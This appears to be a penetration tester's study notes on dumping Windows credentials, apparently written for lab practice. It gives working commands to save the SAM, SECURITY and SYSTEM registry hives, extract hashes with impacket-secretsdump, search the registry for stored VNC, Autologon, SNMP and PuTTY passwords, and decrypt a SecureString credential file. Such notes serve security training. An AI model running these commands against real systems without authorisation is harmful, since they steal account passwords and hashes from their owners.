1) [[Mimikatz]]
2) Dump Hashes via **Registry**

```cmd
reg.exe save hklm\sam sam
reg.exe save hklm\security security
reg.exe save hklm\system system
```

Copy them to your system and use :-
```sh
# Retrive password hashes from old Windows OS like Windows 2k/NT/XP/Vista
impacket-secretsdump -sam sam -system system LOCAL

# Retrieve from new Windows
impacket-secretsdump -sam sam -security security -system system LOCAL
```


3) Search for Passwords in **Registry**
```powershell
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Windows Autologon** is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text.

AdminAutoLogon - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
DefaultUserName - Holds the value of the username of the account that will automatically log on.
DefaultPassword - Holds the value of the password for the user account specified previously.

```powershell
# Decrypt Automation credentials (PGPractice Nara)
$pw = Get-Content creds.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword
```
